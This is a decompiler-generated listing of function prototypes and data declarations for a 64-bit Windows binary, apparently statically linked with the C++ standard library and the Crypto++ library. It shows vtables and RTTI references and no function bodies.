__int64 __fastcall sub_13F167C04(unsigned int);
__int64 __fastcall sub_13F167C4C(unsigned int, __int64);
__int64 __fastcall sub_13F167CA0(__int64, unsigned int, unsigned int);
uintptr_t sub_13F167D04();
__int64 *__fastcall sub_13F167D34(char);
void sub_13F167D90();
__int64 nullsub_1(void); // weak
struct _TEB *__fastcall sub_13F167DC4(__int64);
void sub_13F167E10();
void __fastcall sub_13F167E60(__int64, __int64, __int64);
__int64 sub_13F167EA8();
__int64 __fastcall sub_13F167ED4(int);
__int64 __fastcall sub_13F167EEC(); // weak
__int64 *__fastcall sub_13F16800C(unsigned int);
void sub_13F168020();
void sub_13F16807C();
void sub_13F168088();
void __fastcall sub_13F168094(int, int, int);
void __fastcall sub_13F1681F0(__int64);
__int64 __fastcall sub_13F1681F8(__int64, __int64, __int64, unsigned int, __int64);
__int64 sub_13F1682A0();
void __noreturn sub_13F1682C0();
void sub_13F1682F0();
__int64 __fastcall sub_13F168338(__int64, _BYTE *, unsigned __int64, __int64, __int128 *, __int64);
char __fastcall sub_13F1684E0(__int64, unsigned __int64);
bool __fastcall sub_13F16858C(__int64, char, int);
__int64 __fastcall sub_13F1685BC(__int64, unsigned int, unsigned int, char);
__int64 __fastcall sub_13F168658(__int64, unsigned __int64, unsigned int, char);
__int64 __fastcall sub_13F1686F4(__int64 *, char, int, _DWORD *);
__int64 __fastcall sub_13F168750(__int64, _QWORD *, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1687CC(__int64, __int128 *);
char __fastcall sub_13F16885C(char *, __int64);
char __fastcall sub_13F1688CC(__int64, _DWORD *);
__int64 __fastcall sub_13F168950(__int64);
__int64 __fastcall sub_13F168B64(__int64);
char __fastcall sub_13F168D68(__int64);
char __fastcall sub_13F168DDC(__int64);
char __fastcall sub_13F168E74(__int64);
char __fastcall sub_13F168FF0(__int64);
char __fastcall sub_13F16926C(__int64);
char __fastcall sub_13F1692EC(__int64);
char __fastcall sub_13F169508(__int64);
char __fastcall sub_13F1695BC(__int64, unsigned int, char);
char __fastcall sub_13F16975C(__int64);
char __fastcall sub_13F169838(__int64);
char __fastcall sub_13F1698C8(__int64);
__int64 __fastcall sub_13F1699A0(__int64 *, const __m128i *, int, _DWORD *, int *);
__int64 __fastcall sub_13F169A5C(__int64, _BYTE *, unsigned __int64, __int64, __int128 *, __int64);
__int64 __fastcall sub_13F169C90(__int64, _BYTE *, unsigned __int64, __int64, __int128 *, __int64);
__int64 __fastcall sub_13F169CF4(int);
__int64 __fastcall sub_13F169D3C(int);
int *sub_13F169D8C();
char *sub_13F169DAC();
__int64 __fastcall sub_13F169DCC(__int64, int);
__int64 __fastcall sub_13F169E64(__int64 *);
_BOOL8 __fastcall sub_13F169EA4(int);
void __fastcall sub_13F169EB0(unsigned int, int, int);
void __fastcall __noreturn sub_13F16A01C(unsigned int);
__int64 (__fastcall *__fastcall sub_13F16A068(unsigned int))(_QWORD);
void __fastcall sub_13F16A0D4(__int64);
void sub_13F16A0DC();
void sub_13F16A0EC();
void __fastcall sub_13F16A0FC(unsigned int);
uintptr_t __fastcall sub_13F16A108(__int64);
void __fastcall sub_13F16A14C(unsigned int);
void __noreturn sub_13F16A158();
__int64 __fastcall sub_13F16A180(unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F16A188(_QWORD); // weak
__int64 __fastcall sub_13F16A1A0(_QWORD *, __int64, unsigned __int64);
__int64 __fastcall sub_13F16A230(unsigned __int8 *, __int64);
__int64 __fastcall sub_13F16A298(_QWORD); // weak
__int64 __fastcall sub_13F16A2A0(__int64);
unsigned __int64 __fastcall sub_13F16A2BC(unsigned __int64, unsigned __int64);
unsigned __int64 __fastcall sub_13F16A2C4(unsigned __int64, unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F16A37C(int);
bool __fastcall sub_13F16A3F0(int, __int128 *);
__int64 __fastcall sub_13F16A440(int, __int128 *);
__int64 __fastcall sub_13F16A580(unsigned int);
void __fastcall sub_13F16A5B0(double _XMM0_8);
void __fastcall sub_13F16AAE0(double _XMM0_8, double _XMM1_8);
__int64 __fastcall sub_13F16C174(); // weak
void __fastcall sub_13F16C1C8(__int64);
_BOOL8 __fastcall sub_13F16C1D0(__int64);
__int64 sub_13F16C210();
__int64 __fastcall sub_13F16C244(__int64);
__int64 __fastcall sub_13F16C2A0(int, __int64);
char __fastcall sub_13F16C430(unsigned __int8 *, unsigned __int8 **, unsigned __int8 *, _QWORD *, _QWORD *);
__int64 __fastcall sub_13F16C5EC(unsigned __int64, unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F16C650(int);
__int64 sub_13F16C7C8();
__int64 sub_13F16C810();
__int64 *__fastcall sub_13F16C87C(_BYTE *);
void __fastcall sub_13F16C978(__int64 *);
__int64 sub_13F16C9BC();
void __fastcall sub_13F16CA90(__int64 **);
void __fastcall sub_13F16CAAC(__int64 **);
__int64 sub_13F16CAC8(void); // weak
void sub_13F16CAD0();
__int64 sub_13F16CB08();
__int64 sub_13F16CB2C(void); // weak
__int64 __fastcall sub_13F16CB34(__int64, __int64, _QWORD **);
__int64 __fastcall sub_13F16CB70(__int64, __int64, _QWORD **);
__int64 __fastcall sub_13F16CD10(_QWORD **);
__int64 __fastcall sub_13F16CEEC(__int64);
__int64 __fastcall sub_13F16CEFC(__int64);
__int64 __fastcall sub_13F16CF38(uintptr_t *);
__int64 __fastcall sub_13F16CF78(__int64, __int64);
char sub_13F16CFC0();
char sub_13F16CFD4();
char sub_13F16CFF8();
char sub_13F16D008();
char sub_13F16D05C();
char sub_13F16D064();
char sub_13F16D0F4();
char sub_13F16D108();
__int64 sub_13F16D11C();
void __fastcall sub_13F16D124(int);
bool sub_13F16D12C();
void __fastcall sub_13F16D14C(__int64);
__int64 __fastcall sub_13F16D154(__int64);
void __fastcall sub_13F16D19C(__int64);
void **__fastcall sub_13F16D1C4(_QWORD *, unsigned __int64);
__int64 __fastcall sub_13F16D23C(_QWORD *, _QWORD *);
__int64 __fastcall sub_13F16D288(__int32);
char sub_13F16D2C8();
int *sub_13F16D2F0();
__int64 *sub_13F16D2F8();
__int64 sub_13F16D300();
void sub_13F16D30C();
__int64 __fastcall sub_13F16D354(int);
__int64 sub_13F16D3C0();
__int64 __fastcall sub_13F16D3C8(unsigned __int32);
__int64 *sub_13F16D3F4();
__int64 __fastcall sub_13F16D3FC(_BYTE *, unsigned __int64, __int128 *);
_BYTE *__fastcall sub_13F16D624(_BYTE *);
__int64 __fastcall sub_13F16D680(_BYTE *, unsigned __int64, __int128 *);
__int64 __fastcall sub_13F16D6CC(__int64);
__int64 __fastcall sub_13F16D744(__int64);
__int64 sub_13F16D790();
__int64 __fastcall sub_13F16D79C(int);
double __fastcall sub_13F16D880(double result);
double __fastcall sub_13F16DC78(double);
__int64 __fastcall sub_13F16DD4C(_BYTE *, __int64, __int64);
void __noreturn sub_13F16DDAC();
bool __fastcall sub_13F16DE04(char, unsigned int);
_QWORD *__fastcall sub_13F16DE30(_QWORD *, __int64, _QWORD *);
__int64 __fastcall sub_13F16DE44(__int128 *, unsigned __int8 **, unsigned int, char);
__int64 __fastcall sub_13F16E158(__int64);
__int64 __fastcall sub_13F16E184(_WORD *, _WORD *, __int64);
void __fastcall sub_13F16E1B0(__int64, __int64, __int64);
void __fastcall sub_13F16E210(__int64, __int64, __int64);
void __fastcall sub_13F16E258(__int64, __int64, __int64);
void __fastcall sub_13F16E298(__int64, __int64, __int64 **);
void __fastcall sub_13F16E2D8(__int64);
void __fastcall sub_13F16E3A8(__int64 *);
void __fastcall sub_13F16E3C8(__int64 *);
void __fastcall sub_13F16E4C0(__int64, __int64);
__int64 sub_13F16E528();
__int64 sub_13F16E5BC();
char sub_13F16E65C();
char sub_13F16E698();
__int64 __fastcall sub_13F16E6BC(unsigned __int64, unsigned __int64);
void __fastcall sub_13F16E734(__int64);
__int64 __fastcall sub_13F16E774(unsigned int, __int64, unsigned int *, unsigned int *);
__int64 __fastcall sub_13F16E914(__int64, unsigned int, __int64, unsigned int, __int64, int, __int64, __int64, __int64);
__int64 __fastcall sub_13F16EA04(__int64);
__int64 __fastcall sub_13F16EA5C(unsigned int);
__int64 __fastcall sub_13F16EAB4(unsigned int);
__int64 __fastcall sub_13F16EB0C(unsigned int, __int64);
__int64 __fastcall sub_13F16EB74(__int64);
__int64 __fastcall sub_13F16EBCC(__int64, unsigned int, unsigned int);
__int64 __fastcall sub_13F16EC44(__int64, unsigned int, __int64, unsigned int, __int64, int, __int64, __int64, __int64);
__int64 __fastcall sub_13F16ED34(__int64, unsigned int);
char sub_13F16ED9C();
char sub_13F16EDD4();
char __fastcall sub_13F16EE5C(char);
__int64 sub_13F16EEA0();
__int64 __fastcall sub_13F16EF54(__int64);
char sub_13F16EF94();
__int64 sub_13F16F080();
char sub_13F16F17C();
char sub_13F16F1B8();
__int64 __fastcall sub_13F16F1F8(unsigned __int64);
__int64 __fastcall sub_13F16F258(__int64, _QWORD *, unsigned int);
__int64 __fastcall sub_13F16F288(_WORD *, unsigned __int8 *, unsigned __int64, __int128 *);
__int64 __fastcall sub_13F16F3D0(_WORD *, unsigned __int8 *, unsigned __int64);
__int64 __fastcall sub_13F16F3D8(_DWORD *, _BYTE *, unsigned __int64, unsigned __int16, __int128 *);
__int64 __fastcall sub_13F16F55C(_DWORD *, _BYTE *, unsigned __int64, unsigned __int16);
_BYTE *__fastcall sub_13F16F570(_BYTE *, unsigned __int64);
__int64 __fastcall sub_13F16F6CC(_WORD *, unsigned __int64);
wchar_t **__fastcall sub_13F16F8BC(__int64, wchar_t ***);
__int64 __fastcall sub_13F16F8F0(__int64, __int64 *);
__int64 __fastcall sub_13F16F924(__int64 *);
__int64 __fastcall sub_13F16F98C(__int64 *, __m128i *, unsigned __int64, _BYTE *, __int64, int, char, int, __int128 *);
__int64 __fastcall sub_13F16FCEC(__int64 *, _BYTE *, unsigned __int64, _BYTE *, __int64, int, char, int, __int128 *);
__int64 __fastcall sub_13F16FDBC(_BYTE *, unsigned __int64, int, char, int, __int64, char, __int128 *);
__int64 __fastcall sub_13F16FF98(_BYTE *, __int64, int, _DWORD *, char, __int128 *);
__int64 __fastcall sub_13F1700E0(__int64 *, _BYTE *, unsigned __int64, _BYTE *, __int64, int, char, int, __int128 *);
__int64 __fastcall sub_13F170218(int, unsigned __int8, _BYTE *, unsigned __int64, char);
__int64 __fastcall sub_13F17035C(__int64 *, __m128i *, unsigned __int64, _BYTE *, __int64, int, int, unsigned __int64, __int128 *);
__int64 __fastcall sub_13F1705A0(__int64);
__int64 sub_13F1705C8();
char sub_13F1705E0();
void sub_13F170628();
char sub_13F170644();
void sub_13F17067C();
void sub_13F170698();
void sub_13F1706A8();
__int64 __fastcall sub_13F1706B8(_DWORD *, _QWORD *, char, __int16, _DWORD *, _DWORD *);
__int64 __fastcall sub_13F1706E0(_DWORD *, _QWORD *, char, __int16, _DWORD *, _DWORD *, int);
__int64 __fastcall sub_13F1709E8(_DWORD *, _QWORD *, char, __int16, _DWORD *, _DWORD *);
char *__fastcall sub_13F170A14(int);
__int64 sub_13F170A44();
__int64 __fastcall sub_13F170A64(int, int);
void __fastcall sub_13F170AE0(char);
__int64 sub_13F170B00();
__int64 __fastcall sub_13F170B14(__int64);
__int64 sub_13F170B50();
__int64 __fastcall sub_13F170B80(int, int, __int128 *);
__int64 __fastcall sub_13F170C90(unsigned __int8, __int128 *);
__int64 __fastcall sub_13F170CD0(__int64, __int64, unsigned int, _BYTE *, int, __int64, int, unsigned int, int);
__int64 __fastcall sub_13F17102C(__int128 *, __int64, unsigned int, _BYTE *, int, __int64, int, unsigned int, int);
__int64 __fastcall sub_13F1710D0(); // weak
__m128 __fastcall sub_13F171140(double, double, int);
__m128 __fastcall sub_13F171160(double, double, int);
__m128 __fastcall sub_13F171180(double, double, int, __int16, __int64);
__m128 __fastcall sub_13F171220(double, double, double, unsigned int);
__m128 __fastcall sub_13F171344(float, float, double, unsigned int);
__int64 __fastcall sub_13F1714D0(unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F1714E4(unsigned __int64 *, __int64 *);
__int64 __fastcall sub_13F1716F0(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F171800(unsigned __int64, _BYTE *, _QWORD *);
__int64 __fastcall sub_13F1719AC(__int64 *);
__int64 __fastcall sub_13F171A74(_QWORD, _QWORD); // weak
void __fastcall sub_13F171A7C(__int64, __int64, __int64);
volatile signed __int32 *__fastcall sub_13F171AB4(__int64);
__int64 __fastcall sub_13F171CCC(unsigned int);
char __fastcall sub_13F171D4C(__int64);
char __fastcall sub_13F171DDC(__int64);
__int64 __fastcall sub_13F171FC0(unsigned int, char);
char sub_13F172178();
__int64 sub_13F1721A0();
__int64 __fastcall sub_13F172260(unsigned int, __int64);
__int64 __fastcall sub_13F172508(__int128 *, unsigned __int8, int, unsigned __int8);
__int64 __fastcall sub_13F172580(unsigned __int8);
__int64 sub_13F172594();
__int64 __fastcall sub_13F172698(unsigned __int8 *, int);
__int64 __fastcall sub_13F172988(__int64 *);
__int64 __fastcall sub_13F172A74(unsigned __int8 *, int);
__int64 __fastcall sub_13F172A7C(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_13F172A84(__int64, unsigned __int64, unsigned __int64);
char sub_13F172B1C();
char sub_13F172B38();
char __fastcall sub_13F172B44(_QWORD *, _QWORD *);
char __fastcall sub_13F172BD8(void (__fastcall **)(_QWORD), void (__fastcall **)(_QWORD));
__int64 sub_13F172C28();
__int64 sub_13F172C70();
void __fastcall sub_13F172CA0(__int64);
__int64 __fastcall sub_13F172CC0(unsigned int);
__int64 sub_13F172F5C();
void __fastcall sub_13F172FF4(__int64);
__int64 __fastcall sub_13F173044(unsigned int);
void sub_13F1730FC();
void sub_13F173120();
__int64 __fastcall sub_13F173144(int);
__int64 __fastcall sub_13F173200(int);
void __fastcall sub_13F173278(_QWORD *);
void __fastcall sub_13F173384(__int64);
void __fastcall sub_13F1733F0(unsigned __int64, __int64);
void __fastcall sub_13F173448(__int64 *);
__int64 __fastcall sub_13F173550(__int128 *, unsigned int, __int64, unsigned int, __int64, unsigned int, int);
__int64 __fastcall sub_13F173704(__int64);
void __fastcall sub_13F173790(__int64 *);
void __fastcall sub_13F173930(__int64);
__int64 __fastcall sub_13F173968(__int64);
void __fastcall sub_13F173990(__int64);
__int64 sub_13F173A38();
__int64 __fastcall sub_13F173AA8(__int64 *, __int64);
__int64 __fastcall sub_13F173B10(__int64, __int64, int **);
__int64 __fastcall sub_13F173B9C(int);
__int64 __fastcall sub_13F173C30(__int64, int, unsigned __int64, unsigned int);
_DWORD *__fastcall sub_13F173E38(_DWORD *, int, char *, int);
_DWORD *__fastcall sub_13F173F40(_DWORD *, int, __int16 *, unsigned int);
__int64 __fastcall sub_13F17405C(__int64, int, __int16 *, unsigned int);
__int64 __fastcall sub_13F1741D0(int, __int16 *, unsigned int);
__int64 __fastcall sub_13F1742BC(int, __int16 *, unsigned int);
__m128 __fastcall sub_13F1745A0(double, double, int);
double __fastcall sub_13F174638(int, __int64, __int64, double, __int64, double, __int64);
_BOOL8 __fastcall sub_13F1746A0(char, __int16);
double __fastcall sub_13F17475C(__int64, __int16, __int64, int, char, unsigned int, double, __int64, int);
float __fastcall sub_13F174884(__int64, __int16, int, int, char, unsigned int, float, float, int);
double __fastcall sub_13F1749B8(__int64);
float __fastcall sub_13F1749D4(int);
__int64 __fastcall sub_13F1749E4(__int64);
__int64 __fastcall sub_13F174AAC(__int64);
__int64 __fastcall sub_13F174AE0(__int64);
__int64 __fastcall sub_13F174B64(__int64);
__int64 __fastcall sub_13F174BD0(__int64, unsigned __int64, int, __int64);
__int64 __fastcall sub_13F174C90(__int64, _DWORD *);
__int64 __fastcall sub_13F175160(__int64, int, __int64, _BYTE *, __int64);
__int64 __fastcall sub_13F1764CC(__m128i *, unsigned __int64, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F176554(int);
__int64 sub_13F1765D0();
void __fastcall sub_13F1765E0(unsigned int);
void sub_13F1765EA();
__int64 __fastcall sub_13F176620(_BYTE *, __int64);
void __fastcall sub_13F176640(unsigned __int64, _BYTE *, __int64, int (__fastcall *)(unsigned __int64, _BYTE *));
void __fastcall sub_13F176710(unsigned __int64, unsigned __int64, unsigned __int64, int (__fastcall *)(unsigned __int64, _BYTE *));
__int64 __fastcall sub_13F176A44(_BYTE *, __int64, __int64, __int64);
_BYTE *__fastcall sub_13F176B18(_BYTE *, unsigned __int8 *);
__int64 __fastcall sub_13F176BB8(unsigned __int64, unsigned __int64);
__int64 __fastcall sub_13F176BC0(unsigned __int64, unsigned __int64, __int128 *);
_BOOL8 sub_13F176C58();
__int64 __fastcall sub_13F176C70(unsigned __int8 *, unsigned __int8 *, unsigned __int64);
__int64 __fastcall sub_13F176C88(unsigned __int8 *, unsigned __int8 *, unsigned __int64, __int128 *);
__int64 __fastcall sub_13F176D88(__int64, unsigned __int64);
__int64 __fastcall sub_13F176E0C(int, __int64, unsigned int);
__int64 __fastcall sub_13F176EA8(_QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_13F176EB0(unsigned __int16);
__int64 __fastcall sub_13F176F0C(__int64, __int64, int **);
__int64 __fastcall sub_13F176F80(int);
__int64 __fastcall sub_13F177024(int);
__int64 __fastcall sub_13F1770E0(__int64);
__int64 __fastcall sub_13F177124(_DWORD *);
_BOOL8 __fastcall sub_13F177144(int *);
__int64 __fastcall sub_13F177190(__int64 *);
double __fastcall sub_13F1771E0(double result);
void __fastcall sub_13F1772B0(double _XMM0_8);
__int64 sub_13F17785C();
__int64 sub_13F177874();
int __fastcall sub_13F177888(int);
void __fastcall sub_13F177894(char);
__int64 __fastcall sub_13F1778E4(unsigned __int8 *, unsigned __int8 *, __int64);
__int64 __fastcall sub_13F17792C(unsigned __int8 *, unsigned __int8 *, unsigned __int64);
__int64 __fastcall sub_13F17797C(unsigned __int8 *, unsigned __int8 *, unsigned __int64, __int128 *);
__int64 __fastcall sub_13F177A58(__int64, __int64, unsigned int, _BYTE *, int, _BYTE *, int, unsigned int);
__int64 __fastcall sub_13F177DEC(__int128 *, __int64, unsigned int, _BYTE *, int, _BYTE *, int, unsigned int);
__int64 sub_13F177E78();
__int64 __fastcall sub_13F177EB4(); // weak
int sub_13F177ED4();
int __fastcall sub_13F177F28(int, int);
__int64 sub_13F177F34();
int __fastcall sub_13F177F7C(int, int);
__int64 __fastcall sub_13F178220(_QWORD); // weak
__int64 __fastcall sub_13F178228(__int64);
int *__fastcall sub_13F178274(int *, int);
__int64 sub_13F1782B0();
void __fastcall sub_13F1782F4(int *);
void sub_13F178328();
__int64 __fastcall sub_13F178390(); // weak
__int64 __fastcall sub_13F1783AC(__int64);
__int64 __fastcall sub_13F178410(_QWORD); // weak
__int64 __fastcall sub_13F178418(__int64);
_QWORD *__fastcall sub_13F17841C(_QWORD *, __int64, __int64 *, char *);
_QWORD *__fastcall sub_13F1784B0(_QWORD *, __int64 *, char *);
__int64 __fastcall sub_13F178540(__int64, __int64, char);
void __fastcall sub_13F1786C0(__int64);
__int64 __fastcall sub_13F178778(__int64, char);
__int64 __fastcall sub_13F17879C(__int64, char);
__int64 *sub_13F178818();
__m128i *__fastcall sub_13F17884C(__int64 a1, __m128i *a2, const __m128i *a3, unsigned __int64 a4, __int64 a5);
_QWORD *__fastcall sub_13F178938(_QWORD *);
__int64 __fastcall sub_13F1789BC(__int64);
__int64 __fastcall sub_13F1789DC(__int64);
void __fastcall sub_13F1789EC(__int64);
_QWORD *__fastcall sub_13F1789F8(_QWORD *);
__int64 __fastcall sub_13F178A90(__int64, _QWORD *);
__int64 __fastcall sub_13F178AB0(__int64, _QWORD *, _BYTE *);
__int64 __fastcall sub_13F178B40(__int64);
char *__fastcall sub_13F178D0C(unsigned __int64);
__int64 __fastcall sub_13F178D74(_QWORD *, _QWORD *);
void __fastcall sub_13F178D9C(_QWORD *);
__int64 __fastcall sub_13F178DA8(_QWORD *);
__int64 __fastcall sub_13F178E30(__int64);
void __fastcall __noreturn sub_13F178E38(__int64);
_QWORD *__fastcall sub_13F178E4C(__int64 (__fastcall ***)());
char __fastcall sub_13F178EB0(__int64);
__int64 __fastcall sub_13F178EBC(__int64, __int64, __m128i *);
char __fastcall sub_13F178FA4(__int64);
__int64 __fastcall sub_13F178FB0(__int64);
char __fastcall sub_13F178FBC(__int64);
__int64 __fastcall sub_13F178FE4();
__int64 __fastcall sub_13F179008();
bool __fastcall sub_13F179030(__int64 a1, __int64 a2, int a3);
bool sub_13F179040();
bool sub_13F17905C();
__int64 __fastcall sub_13F17907C(__int64);
__int64 __fastcall sub_13F179094(__int64);
__int64 __fastcall sub_13F1790A4(_QWORD); // weak
__int64 __fastcall sub_13F1790AC(__int64, __int64);
__int64 __fastcall sub_13F1790B4();
__int64 __fastcall sub_13F1790C4(_QWORD, _QWORD); // weak
__int64 __fastcall sub_13F179140(__int64, unsigned __int64);
__int64 __fastcall sub_13F179190(__int64);
_BOOL8 __fastcall sub_13F1791E0(__int64);
__m128i *__fastcall sub_13F179210(__m128i *, int);
__int8 *__fastcall sub_13F17935C(__int64, unsigned __int8);
void __fastcall sub_13F1793F0(double _XMM0_8, double _XMM1_8, double _XMM2_8);
__int64 __fastcall sub_13F17A2B8(); // weak
__int64 __fastcall sub_13F17A2F0(__int64, __int64, unsigned int);
__int64 __fastcall sub_13F17A440(__int64, __int64);
__int64 sub_13F17A530();
void **__fastcall sub_13F17A920(__int64, __int64, __int64, unsigned __int64, __int64, _QWORD *);
__int64 __fastcall sub_13F17ADE0(__int64, unsigned __int64, __int64, __int64, __m128i *, __int64 *);
__int64 __fastcall sub_13F17AFE0(__m128i *, unsigned __int64, const __m128i *, unsigned __int64);
__int64 sub_13F17B090();
__int64 __fastcall sub_13F17B4A0(char *);
__int64 __fastcall sub_13F17B4D0(char *);
__int64 __fastcall guard_dispatch_icall_nop(); // weak
__int64 __fastcall sub_13F17F4C0(); // weak
void sub_13F17F4D0();
void sub_13F17F540();
void **sub_13F17F5C0();
__int64 __fastcall sub_13F17F5E0(); // weak
__int64 __fastcall sub_13F17F630(); // weak
__int64 __fastcall sub_13F17F680(); // weak
__int64 __fastcall sub_13F17F6D0(); // weak
__int64 __fastcall sub_13F17F700(); // weak
void sub_13F17F750();
__int64 (__fastcall **sub_13F17F7A0())();
__int64 __fastcall sub_13F17F830(); // weak
void sub_13F17F8BC();
__int64 __fastcall sub_13F17F8C8(); // weak
void sub_13F17F8D4();
void sub_13F17F8E0();
__int64 __fastcall sub_13F17F928(); // weak
__int64 __fastcall sub_13F17F970(); // weak
__int64 __fastcall start(__int64, __int64);
int *__fastcall sub_13F1D8642(unsigned int);
__int64 __fastcall sub_13F1D8680(__int64, __int64);

//-------------------------------------------------------------------------
// Data declarations

__int64 (__fastcall *_guard_check_icall_fptr)(_QWORD) = &guard_check_icall_nop; // weak
__int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD) = &guard_dispatch_icall_nop; // weak
__int64 qword_13F180588 = 0i64; // weak
__int64 qword_13F1805B0 = 0i64; // weak
__int64 qword_13F1805B8 = 0i64; // weak
__int64 qword_13F1805C0[4] = { 0i64, 0i64, 0i64, 0i64 }; // weak
_UNKNOWN std::exception::`vftable'; // weak
__int64 (__fastcall *off_13F180600[2])() = { &sub_13F101480, &sub_13F101460 }; // weak
void *std::logic_error::`vftable' = &sub_13F101480; // weak
__int64 (__fastcall *off_13F180640[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &std::length_error::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F180658[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &std::out_of_range::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F180670[3])() =
{
  &sub_13F101480,
  &sub_13F101460,
  &std::runtime_error::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F180688[2])() = { &sub_13F101480, &sub_13F101460 }; // weak
char *off_13F180698[2] = { "device or resource busy", "invalid argument" }; // weak
int dword_13F1806D0[] = { 16 }; // weak
void *std::_System_error::`vftable' = &sub_13F109CA4; // weak
__int64 qword_13F180808[2] = { 8250i64, 5353624128i64 }; // weak
__int64 (__fastcall *off_13F180818[3])() =
{
  &sub_13F109CA4,
  &sub_13F101460,
  &std::_Generic_error_category::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F180830[6])() =
{
  &sub_13F109C80,
  &sub_13F109F54,
  &sub_13F109F1C,
  &sub_13F109E7C,
  &sub_13F109E88,
  &sub_13F109EA4
}; // weak
void *Concurrency::details::stl_critical_section_vista::`vftable' = &loc_13F10A004; // weak
void *off_13F1808A0[6] =
{
  &loc_13F10A010,
  &sub_13F10A1AC,
  &sub_13F10A1AC,
  &loc_13F10A1E8,
  &guard_check_icall_nop,
  &Concurrency::details::stl_critical_section_concrt::`RTTI Complete Object Locator'
}; // weak
void *off_13F1808D0[5] =
{
  &loc_13F109FF8,
  &sub_13F10A188,
  &sub_13F10A1C4,
  &loc_13F10A1D0,
  &sub_13F109FE0
}; // weak
__int64 qword_13F180B80[156] =
{
  102i64,
  5353508960i64,
  100i64,
  5353508992i64,
  101i64,
  5353509008i64,
  113i64,
  5353509032i64,
  7i64,
  5353509056i64,
  33i64,
  5353509080i64,
  14i64,
  5353509104i64,
  9i64,
  5353509120i64,
  104i64,
  5353509144i64,
  32i64,
  5353509160i64,
  106i64,
  5353509176i64,
  103i64,
  5353509200i64,
  107i64,
  5353509232i64,
  108i64,
  5353509256i64,
  18i64,
  5353509280i64,
  109i64,
  5353509304i64,
  16i64,
  5353506544i64,
  41i64,
  5353509336i64,
  8i64,
  5353509360i64,
  17i64,
  5353509384i64,
  27i64,
  5353509400i64,
  38i64,
  5353509416i64,
  40i64,
  5353509440i64,
  110i64,
  5353509464i64,
  111i64,
  5353509488i64,
  42i64,
  5353509512i64,
  25i64,
  5353509536i64,
  4i64,
  5353509576i64,
  22i64,
  5353506568i64,
  29i64,
  5353509592i64,
  5i64,
  5353509608i64,
  21i64,
  5353509624i64,
  115i64,
  5353509640i64,
  116i64,
  5353509656i64,
  117i64,
  5353509672i64,
  118i64,
  5353509688i64,
  119i64,
  5353509712i64,
  10i64,
  5353509728i64,
  121i64,
  5353509752i64,
  39i64,
  5353509760i64,
  120i64,
  5353509784i64,
  122i64,
  5353509808i64,
  123i64,
  5353509824i64,
  28i64,
  5353509848i64,
  124i64,
  5353509872i64,
  6i64,
  5353509896i64,
  19i64,
  5353509928i64,
  2i64,
  5353509944i64,
  3i64,
  5353506592i64,
  20i64,
  5353509976i64,
  128i64,
  5353509992i64,
  125i64,
  5353510008i64,
  126i64,
  5353510024i64,
  12i64,
  5353506608i64,
  129i64,
  5353510040i64,
  105i64,
  5353510056i64,
  112i64,
  5353510080i64,
  1i64,
  5353506632i64,
  130i64,
  5353510104i64,
  140i64,
  5353510128i64,
  133i64,
  5353510152i64,
  13i64,
  5353510168i64,
  134i64,
  5353510192i64,
  135i64,
  5353510208i64,
  30i64,
  5353510232i64,
  36i64,
  5353506656i64,
  11i64,
  5353506688i64,
  34i64,
  5353510256i64,
  127i64,
  5353510280i64,
  137i64,
  5353510304i64,
  139i64,
  5353510320i64,
  138i64,
  5353510336i64,
  23i64,
  5353510352i64,
  24i64,
  5353510384i64,
  31i64,
  5353510408i64,
  114i64,
  5353510424i64,
  132i64,
  5353510456i64,
  136i64,
  5353510472i64
}; // weak
void *std::bad_cast::`vftable' = &sub_13F101480; // weak
__int64 (__fastcall *off_13F181CA8[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::InvalidArgument::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F181CC0[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::NotImplemented::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F181CD8[3])() =
{
  &sub_13F1015C0,
  &sub_13F1015B0,
  &CryptoPP::BERDecodeErr::`RTTI Complete Object Locator'
}; // weak
__int64 (__fastcall *off_13F181CF0[2])() = { &sub_13F1015C0, &sub_13F1015B0 }; // weak
void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable' = &sub_13F1015C0; // weak
__int64 (__fastcall *off_13F181D38[46])() =
{
  &sub_13F10B6E0,
  &sub_13F101F70,
  &sub_13F102040,
  &sub_13F102080,
  &sub_13F102480,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F1024A0,
  &sub_13F131F00,
  &sub_13F102490,
  &sub_13F105160,
  &sub_13F110580,
  &sub_13F10FFA0,
  &sub_13F110670,
  &guard_check_icall_nop,
  &sub_13F1024C0,
  &sub_13F10D000,
  &sub_13F10FA20,
  &sub_13F131D10,
  &sub_13F131DD0,
  &sub_13F131F70,
  &sub_13F132030,
  &sub_13F111150,
  &sub_13F111450,
  &sub_13F1107C0,
  &sub_13F10F9D0,
  &sub_13F110410,
  &sub_13F111240,
  &sub_13F1111D0,
  &sub_13F102490,
  &sub_13F1024D0,
  &sub_13F1024C0,
  &sub_13F132460,
  &sub_13F131A10,
  &sub_13F10FAF0,
  &sub_13F105160,
  &sub_13F10FD20,
  &sub_13F10FB70,
  &sub_13F105160,
  &sub_13F110F70,
  &sub_13F102490,
  &sub_13F102500,
  &sub_13F1024C0,
  &sub_13F102530,
  &sub_13F10FA70,
  &CryptoPP::ByteQueue::Walker::`RTTI Complete Object Locator'
}; // weak
void *off_13F181EA8[4] =
{
  &loc_13F10B650,
  &sub_13F1103A0,
  &sub_13F110450,
  &CryptoPP::OID::`RTTI Complete Object Locator'
}; // weak
